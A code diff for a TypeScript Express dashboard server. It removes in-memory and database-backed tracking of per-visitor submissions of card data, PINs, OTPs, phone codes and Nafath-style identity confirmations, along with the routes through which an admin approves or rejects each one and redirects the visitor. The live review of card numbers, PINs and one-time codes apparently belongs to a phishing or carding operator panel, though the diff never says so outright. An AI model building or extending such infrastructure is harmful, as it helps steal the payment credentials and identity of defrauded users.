@@ -23,161 +23,6 @@ type DashboardEntry = {
   raw?: Record<string, any>;
 };
 
-// ==========================================
-// LOCAL MEMORY STORE FOR PENDING DECISIONS
-// (Deleted on server restart) - DEPRECATED
-// ==========================================
-// pendingDecisions[visitorId] = { card: {status: 'pending', timestamp}, otp: {...}, pin: {...}, phone: {...} }
-type PendingDecision = {
-  status: 'pending';
-  timestamp: number;
-};
-
-type PendingDecisions = {
-  card?: PendingDecision;
-  otp?: PendingDecision;
-  pin?: PendingDecision;
-  phone?: PendingDecision;
-};
-
-const pendingDecisions: Map<string, PendingDecisions> = new Map();
-
-// Set pending decision when customer submits new data - DEPRECATED (use setBoxTimestamp instead)
-function setPendingDecision(visitorId: string, boxType: 'card' | 'otp' | 'pin' | 'phone') {
-  const visitorDecisions = pendingDecisions.get(visitorId) || {};
-  visitorDecisions[boxType] = { status: 'pending', timestamp: Date.now() };
-  pendingDecisions.set(visitorId, visitorDecisions);
-  console.log(`[Pending DEPRECATED] Set ${boxType} pending for visitor ${visitorId}`);
-}
-
-// Get pending decision - DEPRECATED (use getBoxTimestamp instead)
-function getPendingDecision(visitorId: string, boxType: 'card' | 'otp' | 'pin' | 'phone'): PendingDecision | null {
-  const visitorDecisions = pendingDecisions.get(visitorId);
-  if (!visitorDecisions) return null;
-  return visitorDecisions[boxType] || null;
-}
-
-// Get all pending decisions for visitor - DEPRECATED (use getAllBoxTimestamps instead)
-function getAllPendingDecisions(visitorId: string): PendingDecisions {
-  return pendingDecisions.get(visitorId) || {};
-}
-
-// Clear pending decision after admin action - DEPRECATED (use setBoxTimestamp with new status instead)
-function clearPendingDecision(visitorId: string, boxType: 'card' | 'otp' | 'pin' | 'phone') {
-  const visitorDecisions = pendingDecisions.get(visitorId);
-  if (visitorDecisions) {
-    delete visitorDecisions[boxType];
-    if (Object.keys(visitorDecisions).length === 0) {
-      pendingDecisions.delete(visitorId);
-    }
-  }
-  console.log(`[Pending DEPRECATED] Cleared ${boxType} for visitor ${visitorId}`);
-}
-
-// ==========================================
-// NEW BOX TIMESTAMPS SYSTEM (Uses Database - Persistent)
-// ==========================================
-// Box types mapping to their status fields in visitors table
-type BoxType = 'card' | 'otp' | 'pin' | 'phone' | 'nafad' | 'identity' | 'vehicle';
-
-interface BoxTimestamp {
-  id: number;
-  visitor_id: string;
-  box_type: string;
-  status: string;
-  timestamp: Date;
-  updated_at: Date;
-}
-
-// Set box timestamp in database - NEW SYSTEM
-async function setBoxTimestamp(visitorId: string, boxType: BoxType, status: string): Promise<void> {
-  const timestamp = new Date().toISOString();
-  try {
-    // 1. Update visitor_box_events table
-    await pool.query(`
-      INSERT INTO visitor_box_events (visitor_id, box_type, status, event_timestamp, updated_at)
-      VALUES ($1, $2, $3, $4, $4)
-      ON CONFLICT (visitor_id, box_type) 
-      DO UPDATE SET status = $3, event_timestamp = $4, updated_at = $4
-    `, [visitorId, boxType, status, timestamp]);
-    
-    // 2. Sync to dashboard_requests.raw for consistency (same timestamp source)
-    const timestampField = getBoxTimestampField(boxType);
-    if (timestampField) {
-      await pool.query(`
-        UPDATE dashboard_requests 
-        SET raw = jsonb_set(raw, '{${timestampField}}', $1, true)
-        WHERE visitor_id = $2
-      `, [timestamp, visitorId]);
-    }
-    
-    console.log(`[BoxTimestamp] Set ${boxType}=${status} for visitor ${visitorId} at ${timestamp}`);
-  } catch (error) {
-    console.error(`[BoxTimestamp] Error setting ${boxType} for ${visitorId}:`, error);
-  }
-}
-
-// Get box timestamp from database - NEW SYSTEM
-async function getBoxTimestamp(visitorId: string, boxType: BoxType): Promise<BoxTimestamp | null> {
-  try {
-    const result = await pool.query<BoxTimestamp>(
-      `SELECT * FROM visitor_box_events WHERE visitor_id = $1 AND box_type = $2`,
-      [visitorId, boxType]
-    );
-    return result.rows[0] || null;
-  } catch (error) {
-    console.error(`[BoxTimestamp] Error getting ${boxType} for ${visitorId}:`, error);
-    return null;
-  }
-}
-
-// Get all box timestamps for a visitor - NEW SYSTEM
-async function getAllBoxTimestamps(visitorId: string): Promise<Record<string, BoxTimestamp>> {
-  try {
-    const result = await pool.query<BoxTimestamp>(
-      `SELECT * FROM visitor_box_events WHERE visitor_id = $1 ORDER BY updated_at DESC`,
-      [visitorId]
-    );
-    
-    // Convert to map
-    const timestamps: Record<string, BoxTimestamp> = {};
-    result.rows.forEach(row => {
-      timestamps[row.box_type] = row;
-    });
-    return timestamps;
-  } catch (error) {
-    console.error(`[BoxTimestamp] Error getting all timestamps for ${visitorId}:`, error);
-    return {};
-  }
-}
-
-// Map box type to its status field in visitors table
-function getBoxStatusField(boxType: BoxType): string {
-  const fieldMap: Record<BoxType, string> = {
-    'card': '_v1Status',
-    'otp': '_v5Status',
-    'pin': '_v6Status',
-    'phone': 'phoneOtpStatus',
-    'nafad': 'nafadConfirmationStatus',
-    'identity': '_v1Status',
-    'vehicle': '_v4Status',
-  };
-  return fieldMap[boxType] || 'status';
-}
-
-// Map box type to its timestamp field in visitors table  
-function getBoxTimestampField(boxType: BoxType): string {
-  const fieldMap: Record<BoxType, string> = {
-    'card': '_v1UpdatedAt',
-    'otp': '_v5UpdatedAt',
-    'pin': '_v6UpdatedAt',
-    'phone': '_v7UpdatedAt',
-    'nafad': 'nafadUpdatedAt',
-    'identity': '_v1UpdatedAt',
-    'vehicle': '_v4UpdatedAt',
-  };
-  return fieldMap[boxType] || 'updatedAt';
-}
 
 // SSE clients for real-time updates
 const sseClients = new Set<express.Response>();
@@ -485,29 +330,6 @@ async function initDatabase() {
           { name: "event_type", definition: "TEXT" },
           { name: "payload", definition: "JSONB NOT NULL DEFAULT '{}'::jsonb" },
           { name: "created_at", definition: "TIMESTAMPTZ NOT NULL DEFAULT NOW()" },
-        ] as ColumnSpec[],
-      },
-      {
-        // NEW: Box timestamps for real-time updates - replaces pendingDecisions
-        name: "visitor_box_events",
-        createSql: `
-          CREATE TABLE IF NOT EXISTS visitor_box_events (
-            id SERIAL PRIMARY KEY,
-            visitor_id TEXT NOT NULL,
-            box_type TEXT NOT NULL,
-            status TEXT NOT NULL DEFAULT 'pending',
-            event_timestamp TIMESTAMPTZ NOT NULL DEFAULT NOW(),
-            updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
-            UNIQUE(visitor_id, box_type)
-          );
-        `,
-        columns: [
-          { name: "id", definition: "SERIAL" },
-          { name: "visitor_id", definition: "TEXT NOT NULL" },
-          { name: "box_type", definition: "TEXT NOT NULL" },
-          { name: "status", definition: "TEXT NOT NULL DEFAULT 'pending'" },
-          { name: "event_timestamp", definition: "TIMESTAMPTZ NOT NULL DEFAULT NOW()" },
-          { name: "updated_at", definition: "TIMESTAMPTZ NOT NULL DEFAULT NOW()" },
         ] as ColumnSpec[],
       },
     ];
@@ -903,27 +725,6 @@ async function getDashboardEntries(): Promise<DashboardEntry[]> {
       `SELECT id, customer, status, stage, updated, badge, visitor_id AS "visitorId", submitted_at AS "submittedAt", raw FROM dashboard_requests ORDER BY submitted_at DESC, id DESC`,
     );
 
-    // Get all box timestamps from visitor_box_events for consistency
-    const { rows: timestamps } = await pool.query(`
-      SELECT visitor_id, box_type, status, event_timestamp, updated_at 
-      FROM visitor_box_events
-    `);
-
-    // Convert timestamps to map: { visitorId: { boxType: BoxTimestamp } }
-    const timestampsMap: Record<string, Record<string, BoxTimestamp>> = {};
-    timestamps.forEach(row => {
-      if (!timestampsMap[row.visitor_id]) {
-        timestampsMap[row.visitor_id] = {};
-      }
-      timestampsMap[row.visitor_id][row.box_type] = {
-        visitor_id: row.visitor_id,
-        box_type: row.box_type,
-        status: row.status,
-        event_timestamp: row.event_timestamp,
-        updated_at: row.updated_at,
-      };
-    });
-
     return rows.map((row) => ({
       id: row.id,
       customer: row.customer || "زائر",
@@ -935,7 +736,6 @@ async function getDashboardEntries(): Promise<DashboardEntry[]> {
       visitorId: row.visitorId || undefined,
       submittedAt: row.submittedAt || undefined,
       raw: row.raw || {},
-      boxTimestamps: timestampsMap[row.visitorId] || {}, // Include box timestamps for consistency
     }));
   } catch (error) {
     console.error("[Dashboard] DB QUERY FAILED:", error);
@@ -1103,9 +903,6 @@ async function startServer() {
       const customerName = currentVisitor.ownerName || currentVisitor.phoneNumber || "زائر";
       const now = new Date().toISOString();
       
-      // Clear pending decision from local memory
-      clearPendingDecision(visitorId, boxType);
-      
       // Prepare redirect data based on box type and action
       let targetPage = "";
       let updateData: Record<string, any> = {
@@ -1211,23 +1008,6 @@ async function startServer() {
       }, { preserveTimestamp: true }); // Don't update timestamps on admin actions
       
       broadcastToDashboard("dashboard:update", dashboardData);
-      
-      // Broadcast box:update event WITHOUT changing the timestamp
-      // Timestamp should ONLY be set by customer submissions, NOT by admin actions
-      const decisionStatus = action === "approve" ? "approved" : "rejected";
-      
-      // Get existing timestamp from database (don't change it)
-      const existingTimestamp = await getBoxTimestamp(visitorId, boxType as BoxType);
-      
-      broadcastToDashboard("box:update", {
-        visitorId,
-        boxType,
-        status: decisionStatus,
-        // Keep existing timestamp if available, otherwise use current time
-        timestamp: existingTimestamp?.event_timestamp || new Date().toISOString(),
-        action: 'decision',
-        updateType: 'status_only' // Indicates this is only a status update, not new data
-      });
       
       res.json({
         success: true,
@@ -1347,112 +1127,6 @@ async function startServer() {
       mode: "local-project-dashboard",
       database: process.env.DATABASE_URL ? "neon-configured" : "waiting-for-neon-url",
     });
-  });
-
-  // ==========================================
-  // PENDING DECISIONS APIs (Local Memory)
-  // ==========================================
-  
-  // Get pending decisions for a visitor
-  app.get("/api/pending/:visitorId", (req, res) => {
-    const { visitorId } = req.params;
-    const pending = getAllPendingDecisions(visitorId);
-    res.json({ visitorId, pending });
-  });
-
-  // Set pending decision (called when customer submits new data)
-  app.post("/api/pending/:visitorId/:boxType", (req, res) => {
-    const { visitorId, boxType } = req.params;
-    if (['card', 'otp', 'pin', 'phone'].includes(boxType)) {
-      setPendingDecision(visitorId, boxType as any);
-      // Broadcast to dashboard
-      broadcastToDashboard("pending:update", { visitorId, boxType, status: "pending" });
-      res.json({ success: true });
-    } else {
-      res.status(400).json({ error: "Invalid box type" });
-    }
-  });
-
-  // Clear pending decision (called after admin action)
-  app.delete("/api/pending/:visitorId/:boxType", (req, res) => {
-    const { visitorId, boxType } = req.params;
-    if (['card', 'otp', 'pin', 'phone'].includes(boxType)) {
-      clearPendingDecision(visitorId, boxType as any);
-      // Broadcast to dashboard
-      broadcastToDashboard("pending:update", { visitorId, boxType, status: "cleared" });
-      res.json({ success: true });
-    } else {
-      res.status(400).json({ error: "Invalid box type" });
-    }
-  });
-
-  // ==========================================
-  // NEW BOX TIMESTAMPS API (Uses visitor_box_events table)
-  // ==========================================
-
-  // Get all box timestamps for a visitor
-  app.get("/api/boxes/:visitorId/timestamps", async (req, res) => {
-    const { visitorId } = req.params;
-    try {
-      const timestamps = await getAllBoxTimestamps(visitorId);
-      res.json({ visitorId, timestamps });
-    } catch (error) {
-      console.error("[BoxTimestamp API] Error getting timestamps:", error);
-      res.status(500).json({ error: "Failed to get box timestamps" });
-    }
-  });
-
-  // Get specific box timestamp
-  app.get("/api/boxes/:visitorId/:boxType/timestamp", async (req, res) => {
-    const { visitorId, boxType } = req.params;
-    const validBoxTypes = ['card', 'otp', 'pin', 'phone', 'nafad', 'identity', 'vehicle'];
-    
-    if (!validBoxTypes.includes(boxType)) {
-      res.status(400).json({ error: "Invalid box type" });
-      return;
-    }
-    
-    try {
-      const timestamp = await getBoxTimestamp(visitorId, boxType as BoxType);
-      res.json({ visitorId, boxType, timestamp });
-    } catch (error) {
-      console.error("[BoxTimestamp API] Error getting timestamp:", error);
-      res.status(500).json({ error: "Failed to get box timestamp" });
-    }
-  });
-
-  // Set box timestamp (for pending status or decision)
-  app.post("/api/boxes/:visitorId/:boxType", async (req, res) => {
-    const { visitorId, boxType } = req.params;
-    const { status } = req.body;
-    const validBoxTypes = ['card', 'otp', 'pin', 'phone', 'nafad', 'identity', 'vehicle'];
-    
-    if (!validBoxTypes.includes(boxType)) {
-      res.status(400).json({ error: "Invalid box type" });
-      return;
-    }
-    
-    if (!status) {
-      res.status(400).json({ error: "Missing status" });
-      return;
-    }
-    
-    try {
-      await setBoxTimestamp(visitorId, boxType as BoxType, status);
-      
-      // Broadcast to dashboard with the specific box type and timestamp
-      broadcastToDashboard("box:update", { 
-        visitorId, 
-        boxType, 
-        status,
-        timestamp: new Date().toISOString()
-      });
-      
-      res.json({ success: true, visitorId, boxType, status });
-    } catch (error) {
-      console.error("[BoxTimestamp API] Error setting timestamp:", error);
-      res.status(500).json({ error: "Failed to set box timestamp" });
-    }
   });
 
   app.post("/api/visitors", async (req, res) => {
